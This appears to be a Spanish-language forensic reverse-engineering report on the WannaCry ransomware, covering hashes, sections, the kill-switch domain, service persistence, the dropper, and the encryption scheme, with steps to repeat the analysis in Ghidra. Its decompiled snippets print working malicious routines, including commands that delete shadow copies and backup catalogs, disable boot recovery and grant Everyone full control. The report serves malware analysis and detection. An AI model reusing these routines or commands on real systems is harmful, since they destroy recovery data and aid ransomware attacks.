# Análisis Forense de Código en Ghidra 12.2: WanaCrypt0r 2.0
## Ingeniería Inversa Estática, Decompilación de APIs y Correlación de Artefactos

Este documento constituye la memoria técnica pericial de ingeniería inversa estática realizada sobre la muestra canónica de **WannaCry (WanaCrypt0r 2.0)** utilizando **Ghidra 12.2** y **OpenJDK 25**.

---

## 1. Ficha Técnica del Binario Analizado

| Parámetro Pericial | Valor Auditado |
|---|---|
| **Nombre de archivo original** | `mssecsvc.exe` (Muestra canónica de referencia mundial) |
| **Hash SHA-256** | `ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa` |
| **Hash MD5** | `84c82835a5d21bbcf75a61706d8ab549` |
| **Tamaño en bytes** | `3.514.368 bytes` (~3.51 MB) |
| **Formato binario** | Portable Executable 32-bit (PE32) para arquitectura x86 (Intel 386) |
| **Subsystem** | Windows GUI (`IMAGE_SUBSYSTEM_WINDOWS_GUI`) |
| **Fecha de compilación (PE Timestamp)** | `2017-05-12 11:03:59 UTC` |
| **Base de imagen preferida (ImageBase)** | `0x00400000` |
| **Punto de entrada (AddressOfEntryPoint)** | `0x00408140` (Sección `.text`) |

---

## 2. Mapa de Secciones del Ejecutable Canónico

| Nombre de Sección | Dirección Virtual (RVA) | Tamaño Virtual | Tamaño Raw en Disco | Entropía | Propósito Pericial |
|---|---|---|---|---|---|
| `.text` | `0x00001000` | `0x00035000` | `216.576 bytes` | 6.54 | Código ejecutable: gusano SMB, Kill Switch y lógica del dropper. |
| `.rdata` | `0x00036000` | `0x0000B000` | `43.008 bytes` | 4.89 | Tablas IAT de imports (`WININET`, `ADVAPI32`, `KERNEL32`) y cadenas constantes. |
| `.data` | `0x00041000` | `0x00002000` | `4.096 bytes` | 2.15 | Variables globales y punteros de inicialización. |
| `.rsrc` | `0x00043000` | `0x00315000` | `3.248.128 bytes` | **7.98** | **Recurso cifrado R (0x802):** Contiene el ejecutable secundario `tasksche.exe` comprimido en formato ZIP con contraseña. |

---

## 3. Decompilación de la Fase 1: El Dropper y Gusano (`mssecsvc.exe`)

### 3.1. Punto de Entrada y Comprobación del Kill Switch
Al abrir el binario en Ghidra y navegar a la dirección `0x00408140` (`WinMain`), se observa la lógica de comprobación de conectividad web:

```c
// Decompilación en Ghidra 12.2 en offset 0x00408140 (WinMain)
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
    HINTERNET hInternetSession;
    HINTERNET hUrlHandle;
    LPCSTR szKillSwitchUrl;

    // 1. URL hardcodeada en la sección .rdata (Offset 0x00431418)
    szKillSwitchUrl = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";

    // 2. Inicialización de la biblioteca WININET
    hInternetSession = InternetOpenA("Microsoft Internet Explorer", 
                                     INTERNET_OPEN_TYPE_PRECONFIG, 
                                     NULL, NULL, 0);

    if (hInternetSession != NULL) {
        // 3. Intento de conexión HTTP GET a la URL de interrupción
        hUrlHandle = InternetOpenUrlA(hInternetSession, 
                                     szKillSwitchUrl, 
                                     NULL, 0, 
                                     INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 
                                     0);

        // 4. CONDICIÓN CRÍTICA:
        if (hUrlHandle != NULL) {
            // RAMA EXITOSA (El dominio existe y responde HTTP 200 OK):
            // El malware activa el freno de emergencia y aborta el ataque.
            InternetCloseHandle(hUrlHandle);
            InternetCloseHandle(hInternetSession);
            ExitProcess(0); // TERMINACIÓN LIMPIA
        }

        // Si la conexión falló (hUrlHandle == NULL), cierra la sesión y procede
        InternetCloseHandle(hInternetSession);
    }

    // 5. RAMA DE INFECCIÓN: Si el Kill Switch falló o no respondió, detona la carga
    InfectAndPropagateSystem();
    return 0;
}
```

#### Análisis Forense de la Paradoja del Proxy en el NHS:
- La API `InternetOpenUrlA` utiliza `INTERNET_OPEN_TYPE_PRECONFIG`. Sin embargo, no proporciona credenciales para proxys autenticados (`HTTP 407 Proxy Authentication Required`).
- En los hospitales donde los equipos pasaban por proxy con autenticación o listas de control de acceso restringidas, `InternetOpenUrlA` falló devolviendo `NULL`.
- Esto causó que, aun cuando el dominio ya estaba activo a nivel global, el binario dentro de los hospitales interpretara que el Kill Switch no existía y continuara con la destrucción.

---

### 3.2. Persistencia: Creación del Servicio `mssecsvc2.0`
Siguiendo las referencias cruzadas (XREFs) de la API `CreateServiceA` en `ADVAPI32.DLL`, se localiza la subrutina en `0x00407f20`:

```c
// Decompilación en Ghidra 12.2 en offset 0x00407f20
void InstallWormService(void)
{
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    CHAR szBinaryPath[MAX_PATH];

    // Obtiene la ruta del ejecutable actual (C:\Windows\mssecsvc.exe)
    GetModuleFileNameA(NULL, szBinaryPath, MAX_PATH);

    // Concatena el argumento de servicio
    lstrcatA(szBinaryPath, " -k DcomLaunch");

    // Conecta con el Service Control Manager local
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (hSCManager != NULL) {
        // Crea el servicio malicioso persistente
        hService = CreateServiceA(
            hSCManager,
            "mssecsvc2.0",                                   // lpServiceName
            "Microsoft Security Center (2.0) Service",       // lpDisplayName
            SERVICE_ALL_ACCESS,                              // dwDesiredAccess
            SERVICE_WIN32_OWN_PROCESS,                       // dwServiceType
            SERVICE_AUTO_START,                              // dwStartType (Inicio automático con Windows)
            SERVICE_ERROR_NORMAL,                            // dwErrorControl
            szBinaryPath,                                    // lpBinaryPathName
            NULL, NULL, NULL, NULL, NULL
        );

        if (hService != NULL) {
            StartServiceA(hService, 0, NULL);
            CloseServiceHandle(hService);
        }
        CloseServiceHandle(hSCManager);
    }
}
```

* **Huella Digital en Windows:** Esta llamada genera de inmediato el evento **System.evtx ID 7045**, registrando `ServiceName: mssecsvc2.0` e `ImagePath: C:\Windows\mssecsvc.exe -k DcomLaunch`.

---

### 3.3. Extracción del Payload Cifrador (Recurso R)
En el offset `0x00407c90`, el binario actúa como un **dropper**:

```c
// Decompilación en Ghidra 12.2 en offset 0x00407c90
BOOL ExtractRansomwarePayload(void)
{
    HRSRC hResInfo;
    HGLOBAL hResData;
    DWORD dwResSize;
    LPVOID pResData;
    HANDLE hFile;
    DWORD dwBytesWritten;

    // 1. Localiza el recurso de tipo 'R' con identificador 0x802
    hResInfo = FindResourceA(NULL, (LPCSTR)0x802, "R");
    if (hResInfo == NULL) return FALSE;

    dwResSize = SizeofResource(NULL, hResInfo);
    hResData = LoadResource(NULL, hResInfo);
    pResData = LockResource(hResData);

    // 2. Escribe el recurso extraído en disco como C:\Windows\tasksche.exe
    hFile = CreateFileA("C:\\Windows\\tasksche.exe", 
                        GENERIC_WRITE, 0, NULL, 
                        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, pResData, dwResSize, &dwBytesWritten, NULL);
        CloseHandle(hFile);

        // 3. Ejecuta el cifrador secundario
        WinExec("C:\\Windows\\tasksche.exe", SW_HIDE);
        return TRUE;
    }
    return FALSE;
}
```

---

## 4. Decompilación de la Fase 2: El Cifrador Puro (`tasksche.exe`)

El ejecutable secundario extraído tiene el hash SHA-256 `24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c`.

### 4.1. Descompresión de la Configuración y Contraseña Interna
Al analizar la tabla de cadenas de `tasksche.exe` en Ghidra (`Defined Strings`), se identifican las cadenas de descompresión:
- **Contraseña estática embebida:** `WNcry@2ol7`
- **Archivos contenidos en el archivo ZIP interno:**
  - `c.wnry`: Configuración de direcciones de pago Bitcoin y URLs C2 en red Tor.
  - `t.wnry`: Biblioteca DLL de cifrado real inyectada reflectivamente en memoria.
  - `u.wnry`: Interfaz gráfica de rescate `@WanaDecryptor@.exe`.
  - `b.wnry`: Imagen BMP modificada para el fondo de pantalla de advertencia.
  - `taskse.exe`: Proceso elevador de privilegios para ejecutar el cifrado en todas las sesiones de usuario activas.

---

### 4.2. Sabotaje Antiforense: Destrucción de Volume Shadow Copies
En la función ubicada en `0x00401a80` de `tasksche.exe`, el malware prepara y ejecuta comandos para neutralizar cualquier intento de restauración local:

```c
// Decompilación en Ghidra 12.2 en offset 0x00401a80
void SabotageShadowCopiesAndBackup(void)
{
    // Destruye todas las instantáneas de volumen (Volume Shadow Copies)
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  "/c vssadmin delete shadows /all /quiet", NULL, SW_HIDE);

    // Deshabilita el catálogo de copia de seguridad de Windows
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  "/c wbadmin delete catalog -quiet", NULL, SW_HIDE);

    // Deshabilita la recuperación del inicio en el BCD
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  "/c bcdedit /set {default} recoveryenabled No", NULL, SW_HIDE);

    // Ignora fallos de booteo
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  "/c bcdedit /set {default} bootstatuspolicy ignoreallfailures", NULL, SW_HIDE);

    // Concede permisos totales a Everyone sobre la unidad
    ShellExecuteA(NULL, "open", "cmd.exe", 
                  "/c icacls . /grant Everyone:F /T /C /Q", NULL, SW_HIDE);
}
```

* **Detección Forense:** Esta técnica es detectable en **Security.evtx (Evento ID 4688)** y mediante **Sysmon (Evento ID 1)**, registrando a `tasksche.exe` como proceso padre ejecutando `cmd.exe /c vssadmin...`.

---

### 4.3. Esquema Criptográfico Híbrido (AES-128-CBC + RSA-2048)
El proceso de cifrado sigue una arquitectura híbrida estándar mediante la **CryptoAPI nativa de Windows**:

```text
[Generación de Clave Efímera]
       │
       ▼ (CryptGenRandom)
[Clave AES-128 única por cada archivo víctima]
       │
       ├─────────────────────────────────────────┐
       ▼                                         ▼
[Cifra el contenido del archivo]        [Cifra la clave AES con la clave pública]
(Modo CBC, bloques de 16 bytes)         (RSA-2048 embebida en el malware)
       │                                         │
       └────────────────────┬────────────────────┘
                            │
                            ▼
              [Escribe la cabecera WANACRY!]
              [Escribe la clave AES cifrada]
              [Escribe el flujo de datos cifrados]
              [Renombra archivo a extensión .WNCRY]
```

#### Estructura de la Cabecera de Archivos Cifrados:
Todo archivo procesado contiene la siguiente cabecera fija de 8 bytes:
- Hexadecimal: `57 41 4E 41 43 52 59 21`
- ASCII: **`WANACRY!`**
- Offset `0x08 - 0x0B`: Longitud de la clave cifrada (típicamente `0x00000100` = 256 bytes correspondientes al bloque RSA-2048).
- Offset `0x0C - 0x10B`: La clave simétrica AES cifrada con la clave pública de los atacantes.

---

## 5. Procedimiento Práctico para Analizar la Muestra en Ghidra 12.2

Para reproducir este análisis en una estación de laboratorio sin riesgo:

1. **Creación del Proyecto:**
   - Abrir Ghidra 12.2 (`ghidraRun.bat` o `./ghidraRun`).
   - Crear un nuevo proyecto no compartido: `File -> New Project -> Non-Shared Project -> Nombre: Forense_WannaCry_NHS`.
2. **Importación Segura del Binario:**
   - Seleccionar `File -> Import File` y cargar una copia de la muestra canónica `ed01eb...exe`.
   - Formato detectado automáticamente: `PE (Portable Executable) Format: x86:LE:32:default`.
3. **Ejecución del Autoanálisis:**
   - Abrir el archivo en el CodeBrowser.
   - En el cuadro de diálogo de análisis, marcar:
     - `Decompiler Parameter ID`
     - `Windows x86 PE RTTI Analyzer`
     - `Demangler Windows`
     - `Reference`
   - Clic en **Analyze** (duración aproximada: 30 a 45 segundos).
4. **Navegación hacia el Kill Switch:**
   - En la ventana `Symbol Tree`, expandir `Imports -> WININET.DLL`.
   - Clic derecho en `InternetOpenUrlA` -> `Show References to`.
   - Seleccionar la referencia en `WinMain` para visualizar de inmediato la llamada al dominio `iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com`.

